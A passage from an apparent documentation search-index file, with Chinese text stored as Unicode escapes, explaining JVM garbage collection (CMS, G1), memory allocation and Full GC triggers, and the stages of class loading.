\u65E0\u6CD5\u5904\u7406\u6D6E\u52A8\u5783\u573E\uFF0C\u53EF\u80FD\u51FA\u73B0 Concurrent Mode Failure\u3002\u6D6E\u52A8\u5783\u573E\u662F\u6307\u5E76\u53D1\u6E05\u9664\u9636\u6BB5\u7531\u4E8E\u7528\u6237\u7EBF\u7A0B\u7EE7\u7EED\u8FD0\u884C\u800C\u4EA7\u751F\u7684\u5783\u573E\uFF0C\u8FD9\u90E8\u5206\u5783\u573E\u53EA\u80FD\u5230\u4E0B\u4E00\u6B21 GC \u65F6\u624D\u80FD\u8FDB\u884C\u56DE\u6536\u3002\u7531\u4E8E\u6D6E\u52A8\u5783\u573E\u7684\u5B58\u5728\uFF0C\u56E0\u6B64\u9700\u8981\u9884\u7559\u51FA\u4E00\u90E8\u5206\u5185\u5B58\uFF0C\u610F\u5473\u7740 CMS \u6536\u96C6\u4E0D\u80FD\u50CF\u5176\u5B83\u6536\u96C6\u5668\u90A3\u6837\u7B49\u5F85\u8001\u5E74\u4EE3\u5FEB\u6EE1\u7684\u65F6\u5019\u518D\u56DE\u6536\u3002\u5982\u679C\u9884\u7559\u7684\u5185\u5B58\u4E0D\u591F\u5B58\u653E\u6D6E\u52A8\u5783\u573E\uFF0C\u5C31\u4F1A\u51FA\u73B0 Concurrent Mode Failure\uFF0C\u8FD9\u65F6\u865A\u62DF\u673A\u5C06\u4E34\u65F6\u542F\u7528 Serial Old \u6765\u66FF\u4EE3 CMS\u3002
\u6807\u8BB0 - \u6E05\u9664\u7B97\u6CD5\u5BFC\u81F4\u7684\u7A7A\u95F4\u788E\u7247\uFF0C\u5F80\u5F80\u51FA\u73B0\u8001\u5E74\u4EE3\u7A7A\u95F4\u5269\u4F59\uFF0C\u4F46\u65E0\u6CD5\u627E\u5230\u8DB3\u591F\u5927\u8FDE\u7EED\u7A7A\u95F4\u6765\u5206\u914D\u5F53\u524D\u5BF9\u8C61\uFF0C\u4E0D\u5F97\u4E0D\u63D0\u524D\u89E6\u53D1\u4E00\u6B21 Full GC\u3002`},{header:"7. G1 \u6536\u96C6\u5668",slug:"_7-g1-\u6536\u96C6\u5668",content:`G1\uFF08Garbage-First\uFF09\uFF0C\u5B83\u662F\u4E00\u6B3E\u9762\u5411\u670D\u52A1\u7AEF\u5E94\u7528\u7684\u5783\u573E\u6536\u96C6\u5668\uFF0C\u5728\u591A CPU \u548C\u5927\u5185\u5B58\u7684\u573A\u666F\u4E0B\u6709\u5F88\u597D\u7684\u6027\u80FD\u3002HotSpot \u5F00\u53D1\u56E2\u961F\u8D4B\u4E88\u5B83\u7684\u4F7F\u547D\u662F\u672A\u6765\u53EF\u4EE5\u66FF\u6362\u6389 CMS \u6536\u96C6\u5668\u3002
\u5806\u88AB\u5206\u4E3A\u65B0\u751F\u4EE3\u548C\u8001\u5E74\u4EE3\uFF0C\u5176\u5B83\u6536\u96C6\u5668\u8FDB\u884C\u6536\u96C6\u7684\u8303\u56F4\u90FD\u662F\u6574\u4E2A\u65B0\u751F\u4EE3\u6216\u8005\u8001\u5E74\u4EE3\uFF0C\u800C G1 \u53EF\u4EE5\u76F4\u63A5\u5BF9\u65B0\u751F\u4EE3\u548C\u8001\u5E74\u4EE3\u4E00\u8D77\u56DE\u6536\u3002 G1 \u628A\u5806\u5212\u5206\u6210\u591A\u4E2A\u5927\u5C0F\u76F8\u7B49\u7684\u72EC\u7ACB\u533A\u57DF\uFF08Region\uFF09\uFF0C\u65B0\u751F\u4EE3\u548C\u8001\u5E74\u4EE3\u4E0D\u518D\u7269\u7406\u9694\u79BB\u3002 \u901A\u8FC7\u5F15\u5165 Region \u7684\u6982\u5FF5\uFF0C\u4ECE\u800C\u5C06\u539F\u6765\u7684\u4E00\u6574\u5757\u5185\u5B58\u7A7A\u95F4\u5212\u5206\u6210\u591A\u4E2A\u7684\u5C0F\u7A7A\u95F4\uFF0C\u4F7F\u5F97\u6BCF\u4E2A\u5C0F\u7A7A\u95F4\u53EF\u4EE5\u5355\u72EC\u8FDB\u884C\u5783\u573E\u56DE\u6536\u3002\u8FD9\u79CD\u5212\u5206\u65B9\u6CD5\u5E26\u6765\u4E86\u5F88\u5927\u7684\u7075\u6D3B\u6027\uFF0C\u4F7F\u5F97\u53EF\u9884\u6D4B\u7684\u505C\u987F\u65F6\u95F4\u6A21\u578B\u6210\u4E3A\u53EF\u80FD\u3002\u901A\u8FC7\u8BB0\u5F55\u6BCF\u4E2A Region \u5783\u573E\u56DE\u6536\u65F6\u95F4\u4EE5\u53CA\u56DE\u6536\u6240\u83B7\u5F97\u7684\u7A7A\u95F4\uFF08\u8FD9\u4E24\u4E2A\u503C\u662F\u901A\u8FC7\u8FC7\u53BB\u56DE\u6536\u7684\u7ECF\u9A8C\u83B7\u5F97\uFF09\uFF0C\u5E76\u7EF4\u62A4\u4E00\u4E2A\u4F18\u5148\u5217\u8868\uFF0C\u6BCF\u6B21\u6839\u636E\u5141\u8BB8\u7684\u6536\u96C6\u65F6\u95F4\uFF0C\u4F18\u5148\u56DE\u6536\u4EF7\u503C\u6700\u5927\u7684 Region\u3002
\u6BCF\u4E2A Region \u90FD\u6709\u4E00\u4E2A Remembered Set\uFF0C\u7528\u6765\u8BB0\u5F55\u8BE5 Region \u5BF9\u8C61\u7684\u5F15\u7528\u5BF9\u8C61\u6240\u5728\u7684 Region\u3002\u901A\u8FC7\u4F7F\u7528 Remembered Set\uFF0C\u5728\u505A\u53EF\u8FBE\u6027\u5206\u6790\u7684\u65F6\u5019\u5C31\u53EF\u4EE5\u907F\u514D\u5168\u5806\u626B\u63CF\u3002 \u5982\u679C\u4E0D\u8BA1\u7B97\u7EF4\u62A4 Remembered Set \u7684\u64CD\u4F5C\uFF0CG1 \u6536\u96C6\u5668\u7684\u8FD0\u4F5C\u5927\u81F4\u53EF\u5212\u5206\u4E3A\u4EE5\u4E0B\u51E0\u4E2A\u6B65\u9AA4\uFF1A \u521D\u59CB\u6807\u8BB0
\u5E76\u53D1\u6807\u8BB0
\u6700\u7EC8\u6807\u8BB0\uFF1A\u4E3A\u4E86\u4FEE\u6B63\u5728\u5E76\u53D1\u6807\u8BB0\u671F\u95F4\u56E0\u7528\u6237\u7A0B\u5E8F\u7EE7\u7EED\u8FD0\u4F5C\u800C\u5BFC\u81F4\u6807\u8BB0\u4EA7\u751F\u53D8\u52A8\u7684\u90A3\u4E00\u90E8\u5206\u6807\u8BB0\u8BB0\u5F55\uFF0C\u865A\u62DF\u673A\u5C06\u8FD9\u6BB5\u65F6\u95F4\u5BF9\u8C61\u53D8\u5316\u8BB0\u5F55\u5728\u7EBF\u7A0B\u7684 Remembered Set Logs \u91CC\u9762\uFF0C\u6700\u7EC8\u6807\u8BB0\u9636\u6BB5\u9700\u8981\u628A Remembered Set Logs \u7684\u6570\u636E\u5408\u5E76\u5230 Remembered Set \u4E2D\u3002\u8FD9\u9636\u6BB5\u9700\u8981\u505C\u987F\u7EBF\u7A0B\uFF0C\u4F46\u662F\u53EF\u5E76\u884C\u6267\u884C\u3002
\u7B5B\u9009\u56DE\u6536\uFF1A\u9996\u5148\u5BF9\u5404\u4E2A Region \u4E2D\u7684\u56DE\u6536\u4EF7\u503C\u548C\u6210\u672C\u8FDB\u884C\u6392\u5E8F\uFF0C\u6839\u636E\u7528\u6237\u6240\u671F\u671B\u7684 GC \u505C\u987F\u65F6\u95F4\u6765\u5236\u5B9A\u56DE\u6536\u8BA1\u5212\u3002\u6B64\u9636\u6BB5\u5176\u5B9E\u4E5F\u53EF\u4EE5\u505A\u5230\u4E0E\u7528\u6237\u7A0B\u5E8F\u4E00\u8D77\u5E76\u53D1\u6267\u884C\uFF0C\u4F46\u662F\u56E0\u4E3A\u53EA\u56DE\u6536\u4E00\u90E8\u5206 Region\uFF0C\u65F6\u95F4\u662F\u7528\u6237\u53EF\u63A7\u5236\u7684\uFF0C\u800C\u4E14\u505C\u987F\u7528\u6237\u7EBF\u7A0B\u5C06\u5927\u5E45\u5EA6\u63D0\u9AD8\u6536\u96C6\u6548\u7387\u3002 \u5177\u5907\u5982\u4E0B\u7279\u70B9\uFF1A \u7A7A\u95F4\u6574\u5408\uFF1A\u6574\u4F53\u6765\u770B\u662F\u57FA\u4E8E\u201C\u6807\u8BB0 - \u6574\u7406\u201D\u7B97\u6CD5\u5B9E\u73B0\u7684\u6536\u96C6\u5668\uFF0C\u4ECE\u5C40\u90E8\uFF08\u4E24\u4E2A Region \u4E4B\u95F4\uFF09\u4E0A\u6765\u770B\u662F\u57FA\u4E8E\u201C\u590D\u5236\u201D\u7B97\u6CD5\u5B9E\u73B0\u7684\uFF0C\u8FD9\u610F\u5473\u7740\u8FD0\u884C\u671F\u95F4\u4E0D\u4F1A\u4EA7\u751F\u5185\u5B58\u7A7A\u95F4\u788E\u7247\u3002
\u53EF\u9884\u6D4B\u7684\u505C\u987F\uFF1A\u80FD\u8BA9\u4F7F\u7528\u8005\u660E\u786E\u6307\u5B9A\u5728\u4E00\u4E2A\u957F\u5EA6\u4E3A M \u6BEB\u79D2\u7684\u65F6\u95F4\u7247\u6BB5\u5185\uFF0C\u6D88\u8017\u5728 GC \u4E0A\u7684\u65F6\u95F4\u4E0D\u5F97\u8D85\u8FC7 N \u6BEB\u79D2\u3002`},{header:"\u4E09\u3001\u5185\u5B58\u5206\u914D\u4E0E\u56DE\u6536\u7B56\u7565",slug:"\u4E09\u3001\u5185\u5B58\u5206\u914D\u4E0E\u56DE\u6536\u7B56\u7565",content:""},{header:"Minor GC \u548C Full GC",slug:"minor-gc-\u548C-full-gc",content:"Minor GC\uFF1A\u56DE\u6536\u65B0\u751F\u4EE3\uFF0C\u56E0\u4E3A\u65B0\u751F\u4EE3\u5BF9\u8C61\u5B58\u6D3B\u65F6\u95F4\u5F88\u77ED\uFF0C\u56E0\u6B64 Minor GC \u4F1A\u9891\u7E41\u6267\u884C\uFF0C\u6267\u884C\u7684\u901F\u5EA6\u4E00\u822C\u4E5F\u4F1A\u6BD4\u8F83\u5FEB\u3002 Full GC\uFF1A\u56DE\u6536\u8001\u5E74\u4EE3\u548C\u65B0\u751F\u4EE3\uFF0C\u8001\u5E74\u4EE3\u5BF9\u8C61\u5176\u5B58\u6D3B\u65F6\u95F4\u957F\uFF0C\u56E0\u6B64 Full GC \u5F88\u5C11\u6267\u884C\uFF0C\u6267\u884C\u901F\u5EA6\u4F1A\u6BD4 Minor GC \u6162\u5F88\u591A\u3002"},{header:"\u5185\u5B58\u5206\u914D\u7B56\u7565",slug:"\u5185\u5B58\u5206\u914D\u7B56\u7565",content:""},{header:"1. \u5BF9\u8C61\u4F18\u5148\u5728 Eden \u5206\u914D",slug:"_1-\u5BF9\u8C61\u4F18\u5148\u5728-eden-\u5206\u914D",content:"\u5927\u591A\u6570\u60C5\u51B5\u4E0B\uFF0C\u5BF9\u8C61\u5728\u65B0\u751F\u4EE3 Eden \u4E0A\u5206\u914D\uFF0C\u5F53 Eden \u7A7A\u95F4\u4E0D\u591F\u65F6\uFF0C\u53D1\u8D77 Minor GC\u3002"},{header:"2. \u5927\u5BF9\u8C61\u76F4\u63A5\u8FDB\u5165\u8001\u5E74\u4EE3",slug:"_2-\u5927\u5BF9\u8C61\u76F4\u63A5\u8FDB\u5165\u8001\u5E74\u4EE3",content:`\u5927\u5BF9\u8C61\u662F\u6307\u9700\u8981\u8FDE\u7EED\u5185\u5B58\u7A7A\u95F4\u7684\u5BF9\u8C61\uFF0C\u6700\u5178\u578B\u7684\u5927\u5BF9\u8C61\u662F\u90A3\u79CD\u5F88\u957F\u7684\u5B57\u7B26\u4E32\u4EE5\u53CA\u6570\u7EC4\u3002
\u7ECF\u5E38\u51FA\u73B0\u5927\u5BF9\u8C61\u4F1A\u63D0\u524D\u89E6\u53D1\u5783\u573E\u6536\u96C6\u4EE5\u83B7\u53D6\u8DB3\u591F\u7684\u8FDE\u7EED\u7A7A\u95F4\u5206\u914D\u7ED9\u5927\u5BF9\u8C61\u3002
-XX:PretenureSizeThreshold\uFF0C\u5927\u4E8E\u6B64\u503C\u7684\u5BF9\u8C61\u76F4\u63A5\u5728\u8001\u5E74\u4EE3\u5206\u914D\uFF0C\u907F\u514D\u5728 Eden \u548C Survivor \u4E4B\u95F4\u7684\u5927\u91CF\u5185\u5B58\u590D\u5236\u3002`},{header:"3. \u957F\u671F\u5B58\u6D3B\u7684\u5BF9\u8C61\u8FDB\u5165\u8001\u5E74\u4EE3",slug:"_3-\u957F\u671F\u5B58\u6D3B\u7684\u5BF9\u8C61\u8FDB\u5165\u8001\u5E74\u4EE3",content:`\u4E3A\u5BF9\u8C61\u5B9A\u4E49\u5E74\u9F84\u8BA1\u6570\u5668\uFF0C\u5BF9\u8C61\u5728 Eden \u51FA\u751F\u5E76\u7ECF\u8FC7 Minor GC \u4F9D\u7136\u5B58\u6D3B\uFF0C\u5C06\u79FB\u52A8\u5230 Survivor \u4E2D\uFF0C\u5E74\u9F84\u5C31\u589E\u52A0 1 \u5C81\uFF0C\u589E\u52A0\u5230\u4E00\u5B9A\u5E74\u9F84\u5219\u79FB\u52A8\u5230\u8001\u5E74\u4EE3\u4E2D\u3002
-XX:MaxTenuringThreshold \u7528\u6765\u5B9A\u4E49\u5E74\u9F84\u7684\u9608\u503C\u3002`},{header:"4. \u52A8\u6001\u5BF9\u8C61\u5E74\u9F84\u5224\u5B9A",slug:"_4-\u52A8\u6001\u5BF9\u8C61\u5E74\u9F84\u5224\u5B9A",content:"\u865A\u62DF\u673A\u5E76\u4E0D\u662F\u6C38\u8FDC\u8981\u6C42\u5BF9\u8C61\u7684\u5E74\u9F84\u5FC5\u987B\u8FBE\u5230 MaxTenuringThreshold \u624D\u80FD\u664B\u5347\u8001\u5E74\u4EE3\uFF0C\u5982\u679C\u5728 Survivor \u4E2D\u76F8\u540C\u5E74\u9F84\u6240\u6709\u5BF9\u8C61\u5927\u5C0F\u7684\u603B\u548C\u5927\u4E8E Survivor \u7A7A\u95F4\u7684\u4E00\u534A\uFF0C\u5219\u5E74\u9F84\u5927\u4E8E\u6216\u7B49\u4E8E\u8BE5\u5E74\u9F84\u7684\u5BF9\u8C61\u53EF\u4EE5\u76F4\u63A5\u8FDB\u5165\u8001\u5E74\u4EE3\uFF0C\u65E0\u9700\u7B49\u5230 MaxTenuringThreshold \u4E2D\u8981\u6C42\u7684\u5E74\u9F84\u3002"},{header:"5. \u7A7A\u95F4\u5206\u914D\u62C5\u4FDD",slug:"_5-\u7A7A\u95F4\u5206\u914D\u62C5\u4FDD",content:`\u5728\u53D1\u751F Minor GC \u4E4B\u524D\uFF0C\u865A\u62DF\u673A\u5148\u68C0\u67E5\u8001\u5E74\u4EE3\u6700\u5927\u53EF\u7528\u7684\u8FDE\u7EED\u7A7A\u95F4\u662F\u5426\u5927\u4E8E\u65B0\u751F\u4EE3\u6240\u6709\u5BF9\u8C61\u603B\u7A7A\u95F4\uFF0C\u5982\u679C\u6761\u4EF6\u6210\u7ACB\u7684\u8BDD\uFF0C\u90A3\u4E48 Minor GC \u53EF\u4EE5\u786E\u8BA4\u662F\u5B89\u5168\u7684\u3002
\u5982\u679C\u4E0D\u6210\u7ACB\u7684\u8BDD\u865A\u62DF\u673A\u4F1A\u67E5\u770B HandlePromotionFailure \u7684\u503C\u662F\u5426\u5141\u8BB8\u62C5\u4FDD\u5931\u8D25\uFF0C\u5982\u679C\u5141\u8BB8\u90A3\u4E48\u5C31\u4F1A\u7EE7\u7EED\u68C0\u67E5\u8001\u5E74\u4EE3\u6700\u5927\u53EF\u7528\u7684\u8FDE\u7EED\u7A7A\u95F4\u662F\u5426\u5927\u4E8E\u5386\u6B21\u664B\u5347\u5230\u8001\u5E74\u4EE3\u5BF9\u8C61\u7684\u5E73\u5747\u5927\u5C0F\uFF0C\u5982\u679C\u5927\u4E8E\uFF0C\u5C06\u5C1D\u8BD5\u7740\u8FDB\u884C\u4E00\u6B21 Minor GC\uFF1B\u5982\u679C\u5C0F\u4E8E\uFF0C\u6216\u8005 HandlePromotionFailure \u7684\u503C\u4E0D\u5141\u8BB8\u5192\u9669\uFF0C\u90A3\u4E48\u5C31\u8981\u8FDB\u884C\u4E00\u6B21 Full GC\u3002`},{header:"Full GC \u7684\u89E6\u53D1\u6761\u4EF6",slug:"full-gc-\u7684\u89E6\u53D1\u6761\u4EF6",content:"\u5BF9\u4E8E Minor GC\uFF0C\u5176\u89E6\u53D1\u6761\u4EF6\u975E\u5E38\u7B80\u5355\uFF0C\u5F53 Eden \u7A7A\u95F4\u6EE1\u65F6\uFF0C\u5C31\u5C06\u89E6\u53D1\u4E00\u6B21 Minor GC\u3002\u800C Full GC \u5219\u76F8\u5BF9\u590D\u6742\uFF0C\u6709\u4EE5\u4E0B\u6761\u4EF6\uFF1A"},{header:"1. \u8C03\u7528 System.gc()",slug:"_1-\u8C03\u7528-system-gc",content:"\u53EA\u662F\u5EFA\u8BAE\u865A\u62DF\u673A\u6267\u884C Full GC\uFF0C\u4F46\u662F\u865A\u62DF\u673A\u4E0D\u4E00\u5B9A\u771F\u6B63\u53BB\u6267\u884C\u3002\u4E0D\u5EFA\u8BAE\u4F7F\u7528\u8FD9\u79CD\u65B9\u5F0F\uFF0C\u800C\u662F\u8BA9\u865A\u62DF\u673A\u7BA1\u7406\u5185\u5B58\u3002"},{header:"2. \u8001\u5E74\u4EE3\u7A7A\u95F4\u4E0D\u8DB3",slug:"_2-\u8001\u5E74\u4EE3\u7A7A\u95F4\u4E0D\u8DB3",content:`\u8001\u5E74\u4EE3\u7A7A\u95F4\u4E0D\u8DB3\u7684\u5E38\u89C1\u573A\u666F\u4E3A\u524D\u6587\u6240\u8BB2\u7684\u5927\u5BF9\u8C61\u76F4\u63A5\u8FDB\u5165\u8001\u5E74\u4EE3\u3001\u957F\u671F\u5B58\u6D3B\u7684\u5BF9\u8C61\u8FDB\u5165\u8001\u5E74\u4EE3\u7B49\u3002
\u4E3A\u4E86\u907F\u514D\u4EE5\u4E0A\u539F\u56E0\u5F15\u8D77\u7684 Full GC\uFF0C\u5E94\u5F53\u5C3D\u91CF\u4E0D\u8981\u521B\u5EFA\u8FC7\u5927\u7684\u5BF9\u8C61\u4EE5\u53CA\u6570\u7EC4\u3002\u9664\u6B64\u4E4B\u5916\uFF0C\u53EF\u4EE5\u901A\u8FC7 -Xmn \u865A\u62DF\u673A\u53C2\u6570\u8C03\u5927\u65B0\u751F\u4EE3\u7684\u5927\u5C0F\uFF0C\u8BA9\u5BF9\u8C61\u5C3D\u91CF\u5728\u65B0\u751F\u4EE3\u88AB\u56DE\u6536\u6389\uFF0C\u4E0D\u8FDB\u5165\u8001\u5E74\u4EE3\u3002\u8FD8\u53EF\u4EE5\u901A\u8FC7 -XX:MaxTenuringThreshold \u8C03\u5927\u5BF9\u8C61\u8FDB\u5165\u8001\u5E74\u4EE3\u7684\u5E74\u9F84\uFF0C\u8BA9\u5BF9\u8C61\u5728\u65B0\u751F\u4EE3\u591A\u5B58\u6D3B\u4E00\u6BB5\u65F6\u95F4\u3002`},{header:"3. \u7A7A\u95F4\u5206\u914D\u62C5\u4FDD\u5931\u8D25",slug:"_3-\u7A7A\u95F4\u5206\u914D\u62C5\u4FDD\u5931\u8D25",content:"\u4F7F\u7528\u590D\u5236\u7B97\u6CD5\u7684 Minor GC \u9700\u8981\u8001\u5E74\u4EE3\u7684\u5185\u5B58\u7A7A\u95F4\u4F5C\u62C5\u4FDD\uFF0C\u5982\u679C\u62C5\u4FDD\u5931\u8D25\u4F1A\u6267\u884C\u4E00\u6B21 Full GC\u3002\u5177\u4F53\u5185\u5BB9\u8BF7\u53C2\u8003\u4E0A\u9762\u7684\u7B2C 5 \u5C0F\u8282\u3002"},{header:"4. JDK 1.7 \u53CA\u4EE5\u524D\u7684\u6C38\u4E45\u4EE3\u7A7A\u95F4\u4E0D\u8DB3",slug:"_4-jdk-1-7-\u53CA\u4EE5\u524D\u7684\u6C38\u4E45\u4EE3\u7A7A\u95F4\u4E0D\u8DB3",content:`\u5728 JDK 1.7 \u53CA\u4EE5\u524D\uFF0CHotSpot \u865A\u62DF\u673A\u4E2D\u7684\u65B9\u6CD5\u533A\u662F\u7528\u6C38\u4E45\u4EE3\u5B9E\u73B0\u7684\uFF0C\u6C38\u4E45\u4EE3\u4E2D\u5B58\u653E\u7684\u4E3A\u4E00\u4E9B Class \u7684\u4FE1\u606F\u3001\u5E38\u91CF\u3001\u9759\u6001\u53D8\u91CF\u7B49\u6570\u636E\u3002
\u5F53\u7CFB\u7EDF\u4E2D\u8981\u52A0\u8F7D\u7684\u7C7B\u3001\u53CD\u5C04\u7684\u7C7B\u548C\u8C03\u7528\u7684\u65B9\u6CD5\u8F83\u591A\u65F6\uFF0C\u6C38\u4E45\u4EE3\u53EF\u80FD\u4F1A\u88AB\u5360\u6EE1\uFF0C\u5728\u672A\u914D\u7F6E\u4E3A\u91C7\u7528 CMS GC \u7684\u60C5\u51B5\u4E0B\u4E5F\u4F1A\u6267\u884C Full GC\u3002\u5982\u679C\u7ECF\u8FC7 Full GC \u4ECD\u7136\u56DE\u6536\u4E0D\u4E86\uFF0C\u90A3\u4E48\u865A\u62DF\u673A\u4F1A\u629B\u51FA java.lang.OutOfMemoryError\u3002
\u4E3A\u907F\u514D\u4EE5\u4E0A\u539F\u56E0\u5F15\u8D77\u7684 Full GC\uFF0C\u53EF\u91C7\u7528\u7684\u65B9\u6CD5\u4E3A\u589E\u5927\u6C38\u4E45\u4EE3\u7A7A\u95F4\u6216\u8F6C\u4E3A\u4F7F\u7528 CMS GC\u3002`},{header:"5. Concurrent Mode Failure",slug:"_5-concurrent-mode-failure",content:"\u6267\u884C CMS GC \u7684\u8FC7\u7A0B\u4E2D\u540C\u65F6\u6709\u5BF9\u8C61\u8981\u653E\u5165\u8001\u5E74\u4EE3\uFF0C\u800C\u6B64\u65F6\u8001\u5E74\u4EE3\u7A7A\u95F4\u4E0D\u8DB3\uFF08\u53EF\u80FD\u662F GC \u8FC7\u7A0B\u4E2D\u6D6E\u52A8\u5783\u573E\u8FC7\u591A\u5BFC\u81F4\u6682\u65F6\u6027\u7684\u7A7A\u95F4\u4E0D\u8DB3\uFF09\uFF0C\u4FBF\u4F1A\u62A5 Concurrent Mode Failure \u9519\u8BEF\uFF0C\u5E76\u89E6\u53D1 Full GC\u3002"},{header:"\u56DB\u3001\u7C7B\u52A0\u8F7D\u673A\u5236",slug:"\u56DB\u3001\u7C7B\u52A0\u8F7D\u673A\u5236",content:"\u7C7B\u662F\u5728\u8FD0\u884C\u671F\u95F4\u7B2C\u4E00\u6B21\u4F7F\u7528\u65F6\u52A8\u6001\u52A0\u8F7D\u7684\uFF0C\u800C\u4E0D\u662F\u4E00\u6B21\u6027\u52A0\u8F7D\u6240\u6709\u7C7B\u3002\u56E0\u4E3A\u5982\u679C\u4E00\u6B21\u6027\u52A0\u8F7D\uFF0C\u90A3\u4E48\u4F1A\u5360\u7528\u5F88\u591A\u7684\u5185\u5B58\u3002"},{header:"\u7C7B\u7684\u751F\u547D\u5468\u671F",slug:"\u7C7B\u7684\u751F\u547D\u5468\u671F",content:`\u5305\u62EC\u4EE5\u4E0B 7 \u4E2A\u9636\u6BB5\uFF1A \u52A0\u8F7D\uFF08Loading\uFF09
\u9A8C\u8BC1\uFF08Verification\uFF09
\u51C6\u5907\uFF08Preparation\uFF09
\u89E3\u6790\uFF08Resolution\uFF09
\u521D\u59CB\u5316\uFF08Initialization\uFF09
\u4F7F\u7528\uFF08Using\uFF09
\u5378\u8F7D\uFF08Unloading\uFF09`},{header:"\u7C7B\u52A0\u8F7D\u8FC7\u7A0B",slug:"\u7C7B\u52A0\u8F7D\u8FC7\u7A0B",content:"\u5305\u542B\u4E86\u52A0\u8F7D\u3001\u9A8C\u8BC1\u3001\u51C6\u5907\u3001\u89E3\u6790\u548C\u521D\u59CB\u5316\u8FD9 5 \u4E2A\u9636\u6BB5\u3002"},{header:"1. \u52A0\u8F7D",slug:"_1-\u52A0\u8F7D",content:`\u52A0\u8F7D\u662F\u7C7B\u52A0\u8F7D\u7684\u4E00\u4E2A\u9636\u6BB5\uFF0C\u6CE8\u610F\u4E0D\u8981\u6DF7\u6DC6\u3002
\u52A0\u8F7D\u8FC7\u7A0B\u5B8C\u6210\u4EE5\u4E0B\u4E09\u4EF6\u4E8B\uFF1A \u901A\u8FC7\u7C7B\u7684\u5B8C\u5168\u9650\u5B9A\u540D\u79F0\u83B7\u53D6\u5B9A\u4E49\u8BE5\u7C7B\u7684\u4E8C\u8FDB\u5236\u5B57\u8282\u6D41\u3002
\u5C06\u8BE5\u5B57\u8282\u6D41\u8868\u793A\u7684\u9759\u6001\u5B58\u50A8\u7ED3\u6784\u8F6C\u6362\u4E3A\u65B9\u6CD5\u533A\u7684\u8FD0\u884C\u65F6\u5B58\u50A8\u7ED3\u6784\u3002
\u5728\u5185\u5B58\u4E2D\u751F\u6210\u4E00\u4E2A\u4EE3\u8868\u8BE5\u7C7B\u7684 Class \u5BF9\u8C61\uFF0C\u4F5C\u4E3A\u65B9\u6CD5\u533A\u4E2D\u8BE5\u7C7B\u5404\u79CD\u6570\u636E\u7684\u8BBF\u95EE\u5165\u53E3\u3002 \u5176\u4E2D\u4E8C\u8FDB\u5236\u5B57\u8282\u6D41\u53EF\u4EE5\u4ECE\u4EE5\u4E0B\u65B9\u5F0F\u4E2D\u83B7\u53D6\uFF1A \u4ECE ZIP \u5305\u8BFB\u53D6\uFF0C\u6210\u4E3A JAR\u3001EAR\u3001WAR \u683C\u5F0F\u7684\u57FA\u7840\u3002
\u4ECE\u7F51\u7EDC\u4E2D\u83B7\u53D6\uFF0C\u6700\u5178\u578B\u7684\u5E94\u7528\u662F Applet\u3002
\u8FD0\u884C\u65F6\u8BA1\u7B97\u751F\u6210\uFF0C\u4F8B\u5982\u52A8\u6001\u4EE3\u7406\u6280\u672F\uFF0C\u5728 java.lang.reflect.Proxy \u4F7F\u7528 ProxyGenerator.generateProxyClass \u7684\u4EE3\u7406\u7C7B\u7684\u4E8C\u8FDB\u5236\u5B57\u8282\u6D41\u3002
\u7531\u5176\u4ED6\u6587\u4EF6\u751F\u6210\uFF0C\u4F8B\u5982\u7531 JSP \u6587\u4EF6\u751F\u6210\u5BF9\u5E94\u7684 Class \u7C7B\u3002`},{header:"2. \u9A8C\u8BC1",slug:"_2-\u9A8C\u8BC1",content:"\u786E\u4FDD Class \u6587\u4EF6\u7684\u5B57\u8282\u6D41\u4E2D\u5305\u542B\u7684\u4FE1\u606F\u7B26\u5408\u5F53\u524D\u865A\u62DF\u673A\u7684\u8981\u6C42\uFF0C\u5E76\u4E14\u4E0D\u4F1A\u5371\u5BB3\u865A\u62DF\u673A\u81EA\u8EAB\u7684\u5B89\u5168\u3002"},{header:"3. \u51C6\u5907",slug:"_3-\u51C6\u5907",content:`\u7C7B\u53D8\u91CF\u662F\u88AB static \u4FEE\u9970\u7684\u53D8\u91CF\uFF0C\u51C6\u5907\u9636\u6BB5\u4E3A\u7C7B\u53D8\u91CF\u5206\u914D\u5185\u5B58\u5E76\u8BBE\u7F6E\u521D\u59CB\u503C\uFF0C\u4F7F\u7528\u7684\u662F\u65B9\u6CD5\u533A\u7684\u5185\u5B58\u3002
\u5B9E\u4F8B\u53D8\u91CF\u4E0D\u4F1A\u5728\u8FD9\u9636\u6BB5\u5206\u914D\u5185\u5B58\uFF0C\u5B83\u4F1A\u5728\u5BF9\u8C61\u5B9E\u4F8B\u5316\u65F6\u968F\u7740\u5BF9\u8C61\u4E00\u8D77\u88AB\u5206\u914D\u5728\u5806\u4E2D\u3002\u5E94\u8BE5\u6CE8\u610F\u5230\uFF0C\u5B9E\u4F8B\u5316\u4E0D\u662F\u7C7B\u52A0\u8F7D\u7684\u4E00\u4E2A\u8FC7\u7A0B\uFF0C\u7C7B\u52A0\u8F7D\u53D1\u751F\u5728\u6240\u6709\u5B9E\u4F8B\u5316\u64CD\u4F5C\u4E4B\u524D\uFF0C\u5E76\u4E14\u7C7B\u52A0\u8F7D\u53EA\u8FDB\u884C\u4E00\u6B21\uFF0C\u5B9E\u4F8B\u5316\u53EF\u4EE5\u8FDB\u884C\u591A\u6B21\u3002
\u521D\u59CB\u503C\u4E00\u822C\u4E3A 0 \u503C\uFF0C\u4F8B\u5982\u4E0B\u9762\u7684\u7C7B\u53D8\u91CF value \u88AB\u521D\u59CB\u5316\u4E3A 0 \u800C\u4E0D\u662F 123\u3002
public static int value = 123;
\u5982\u679C\u7C7B\u53D8\u91CF\u662F\u5E38\u91CF\uFF0C\u90A3\u4E48\u5B83\u5C06\u521D\u59CB\u5316\u4E3A\u8868\u8FBE\u5F0F\u6240\u5B9A\u4E49\u7684\u503C\u800C\u4E0D\u662F 0\u3002\u4F8B\u5982\u4E0B\u9762\u7684\u5E38\u91CF value \u88AB\u521D\u59CB\u5316\u4E3A 123 \u800C\u4E0D\u662F 0\u3002
public static final int value = 123;`},{header:"4. \u89E3\u6790",slug:"_4-\u89E3\u6790",content:`\u5C06\u5E38\u91CF\u6C60\u7684\u7B26\u53F7\u5F15\u7528\u66FF\u6362\u4E3A\u76F4\u63A5\u5F15\u7528\u7684\u8FC7\u7A0B\u3002
